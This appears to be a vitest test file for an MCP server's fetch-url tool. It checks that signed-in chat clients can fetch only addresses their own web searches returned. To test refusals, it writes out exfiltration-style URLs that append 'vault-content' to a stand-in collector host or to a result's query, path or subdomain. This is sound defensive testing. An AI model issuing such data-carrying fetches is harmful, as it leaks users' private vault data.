/**
 * #531: a client that signed in through the OAuth flow can fetch only an address that
 * web-search returned to it. Service-token and unauthenticated callers are unchanged.
 */
import { describe, it, expect, afterEach } from 'vitest';
import request from 'supertest';
import { join } from 'node:path';
import { mkdtempSync, rmSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { randomBytes } from 'node:crypto';
import { McpServer } from '@modelcontextprotocol/sdk/server/mcp.js';
import type Database from 'better-sqlite3';
import { registerFetchUrl, UNKNOWN_ADDRESS_REFUSAL } from '../../src/mcp/tools/fetch-url.js';
import { registerWebSearch } from '../../src/mcp/tools/web-search.js';
import { KnownWebAddresses } from '../../src/web/known-addresses.js';
import type { LookupFn } from '../../src/web/fetch-url.js';
import type { WebSearchProvider } from '../../src/web/provider.js';
import { createHttpApp } from '../../src/transport/http.js';
import { createServer } from '../../src/mcp/server.js';
import { openDatabase } from '../../src/db/connection.js';
import { createSchema } from '../../src/db/schema.js';
import {
  addUndoTables, addNodeTypesSortOrder, addSchemaUndoSnapshots, addGlobalFieldUndoSnapshots, addUiHints,
  upgradeToMemories, upgradeToMemoriesV2, upgradeToMemoriesV3,
} from '../../src/db/migrate.js';
import { createAuthSchema } from '../../src/auth/schema.js';
import { hashToken } from '../../src/auth/provider.js';

const CHAT_CLIENT = '3f8a5c2e-0000-4000-8000-000000000000';
const OTHER_CHAT_CLIENT = '7d1b9a40-0000-4000-8000-000000000000';
const RESULT_URL = 'https://example.com/article';

const publicLookup: LookupFn = async () => [{ address: '93.184.216.34', family: 4 }];
const searchProvider: WebSearchProvider = {
  name: 'fake',
  search: async () => [{ title: 'Article', url: RESULT_URL, snippet: 'An article.' }],
};

function webServer() {
  const fetched: string[] = [];
  const fakeFetch = (async (input: Parameters<typeof fetch>[0]) => {
    fetched.push(String(input));
    return new Response('<p>Article text</p>', { status: 200, headers: { 'content-type': 'text/html' } });
  }) as typeof fetch;
  const known = new KnownWebAddresses();
  const server = new McpServer({ name: 't', version: '0' });
  registerFetchUrl(server, fakeFetch, publicLookup, known);
  registerWebSearch(server, searchProvider, known);
  return { server, fetched };
}

const as = (clientId: string) => ({ authInfo: { token: 't', clientId, scopes: [] } });

async function call(server: McpServer, name: string, args: Record<string, unknown>, extra: Record<string, unknown> = {}) {
  // eslint-disable-next-line @typescript-eslint/no-explicit-any
  const tool = (server as any)._registeredTools[name];
  if (!tool) throw new Error(`Tool ${name} not registered`);
  return JSON.parse((await tool.handler(args, extra)).content[0].text);
}

describe('fetch-url for a signed-in chat client', () => {
  it('refuses an address web-search did not return, without fetching it', async () => {
    const { server, fetched } = webServer();
    const out = await call(server, 'fetch-url', { url: 'https://collector.example/?d=vault-content' }, as(CHAT_CLIENT));
    expect(out.ok).toBe(false);
    expect(out.error.code).toBe('INVALID_PARAMS');
    expect(out.error.message).toBe(UNKNOWN_ADDRESS_REFUSAL);
    expect(fetched).toEqual([]);
  });

  it('fetches a search result, and only that exact address', async () => {
    const { server, fetched } = webServer();
    expect((await call(server, 'fetch-url', { url: RESULT_URL }, as(CHAT_CLIENT))).ok).toBe(false);

    expect((await call(server, 'web-search', { query: 'article' }, as(CHAT_CLIENT))).ok).toBe(true);
    const read = await call(server, 'fetch-url', { url: RESULT_URL }, as(CHAT_CLIENT));
    expect(read.ok).toBe(true);
    expect(read.data.content).toContain('Article text');
    expect((await call(server, 'fetch-url', { url: `${RESULT_URL}#section` }, as(CHAT_CLIENT))).ok).toBe(true);

    // The same page with data added to it is a different address.
    for (const url of [`${RESULT_URL}?d=vault-content`, `${RESULT_URL}/vault-content`, 'https://vault-content.example.com/article']) {
      expect((await call(server, 'fetch-url', { url }, as(CHAT_CLIENT))).ok, url).toBe(false);
    }
    // The fragment is dropped on the wire; the query-string and path variants never left.
    expect(fetched).toEqual([RESULT_URL, `${RESULT_URL}#section`]);
  });

  it('does not let one client fetch what another client searched for', async () => {
    const { server, fetched } = webServer();
    await call(server, 'web-search', { query: 'article' }, as(CHAT_CLIENT));
    expect((await call(server, 'fetch-url', { url: RESULT_URL }, as(OTHER_CHAT_CLIENT))).ok).toBe(false);
    expect(fetched).toEqual([]);
  });

  it('refuses when no search is available to make an address known', async () => {
    const server = new McpServer({ name: 't', version: '0' });
    registerFetchUrl(server, (async () => new Response('x')) as typeof fetch, publicLookup);
    expect((await call(server, 'fetch-url', { url: RESULT_URL }, as(CHAT_CLIENT))).ok).toBe(false);
  });
});

describe('fetch-url for the suite\'s own callers', () => {
  it('stays unrestricted for a service token and for a caller without auth', async () => {
    const { server, fetched } = webServer();
    expect((await call(server, 'fetch-url', { url: 'https://example.org/one' }, as('service-curator'))).ok).toBe(true);
    expect((await call(server, 'fetch-url', { url: 'https://example.org/two' })).ok).toBe(true);
    expect(fetched).toEqual(['https://example.org/one', 'https://example.org/two']);
  });

  it('does not make a service caller\'s search results fetchable by a chat client', async () => {
    const { server } = webServer();
    await call(server, 'web-search', { query: 'article' }, as('service-curator'));
    expect((await call(server, 'fetch-url', { url: RESULT_URL }, as(CHAT_CLIENT))).ok).toBe(false);
  });
});

describe('over HTTP, with one list shared by a client\'s sessions', () => {
  let db: Database.Database | undefined;
  let tmpDir: string | undefined;

  afterEach(() => {
    db?.close();
    if (tmpDir) rmSync(tmpDir, { recursive: true, force: true });
    db = undefined;
    tmpDir = undefined;
  });

  const ACCEPT = 'application/json, text/event-stream';

  /** The JSON-RPC message of a response that may be JSON or a one-event stream. */
  function rpc(res: request.Response): { result?: { content: Array<{ text: string }> } } {
    if (res.text.startsWith('{')) return JSON.parse(res.text);
    const data = res.text.split('\n').find((line) => line.startsWith('data: '));
    if (!data) throw new Error(`no message in response: ${res.text.slice(0, 200)}`);
    return JSON.parse(data.slice('data: '.length));
  }

  it('lets a chat client fetch in a new session what it searched for in an earlier one', async () => {
    tmpDir = mkdtempSync(join(tmpdir(), 'vault-engine-known-addresses-'));
    db = openDatabase(join(tmpDir, '.vault-engine', 'vault.db'));
    createSchema(db);
    addUndoTables(db);
    createAuthSchema(db);
    addNodeTypesSortOrder(db);
    addSchemaUndoSnapshots(db);
    addGlobalFieldUndoSnapshots(db);
    addUiHints(db);
    upgradeToMemories(db);
    upgradeToMemoriesV2(db);
    upgradeToMemoriesV3(db);
    const database = db;
    const knownWebAddresses = new KnownWebAddresses();
    // A result on a host the private-host guard refuses by its name alone, so a fetch that
    // gets past the known-address rule stops there and this test never touches the network.
    const offlineResult = 'https://article.localhost/page';
    const offlineSearch: WebSearchProvider = {
      name: 'fake', search: async () => [{ title: 'Article', url: offlineResult, snippet: 'An article.' }],
    };
    const app = createHttpApp(
      (options) => createServer(database, { ...options, webSearchProvider: offlineSearch, knownWebAddresses }),
      { db: database, ownerPassword: 'known-addresses-owner-password', issuerUrl: new URL('https://vault.example.test') },
    );
    const tokenFor = (clientId: string) => {
      const token = randomBytes(32).toString('hex');
      const now = Math.floor(Date.now() / 1000);
      database.prepare(`
        INSERT INTO oauth_tokens (token, type, client_id, scopes, resource, created_at, expires_at, revoked)
        VALUES (?, 'access', ?, '', NULL, ?, ?, 0)
      `).run(hashToken(token), clientId, now, now + 3600);
      return token;
    };
    const session = async (token: string) => {
      const init = await request(app).post('/mcp').set('Accept', ACCEPT).set('Authorization', `Bearer ${token}`).send({
        jsonrpc: '2.0', id: 1, method: 'initialize',
        params: { protocolVersion: '2025-11-25', capabilities: {}, clientInfo: { name: 'known-addresses', version: '0' } },
      });
      expect(init.status).toBe(200);
      const id = init.headers['mcp-session-id'] as string;
      return async (name: string, args: Record<string, unknown>) => {
        const res = await request(app).post('/mcp').set('Accept', ACCEPT).set('Authorization', `Bearer ${token}`)
          .set('mcp-session-id', id).send({ jsonrpc: '2.0', id: 2, method: 'tools/call', params: { name, arguments: args } });
        expect(res.status).toBe(200);
        return JSON.parse(rpc(res).result!.content[0]!.text);
      };
    };

    const chat = tokenFor(CHAT_CLIENT);
    const first = await session(chat);
    // An address that was never returned is refused before any lookup or connection.
    const refused = await first('fetch-url', { url: 'https://collector.example/?d=vault-content' });
    expect(refused.error.message).toBe(UNKNOWN_ADDRESS_REFUSAL);
    expect((await first('web-search', { query: 'article' })).ok).toBe(true);

    // A second session of the same client: the address is known, so the call gets past the
    // rule and reaches the private-host guard.
    const second = await session(chat);
    expect((await second('fetch-url', { url: offlineResult })).error.message).toMatch(/private host/);

    const other = await session(tokenFor(OTHER_CHAT_CLIENT));
    expect((await other('fetch-url', { url: offlineResult })).error.message).toBe(UNKNOWN_ADDRESS_REFUSAL);
  });
});
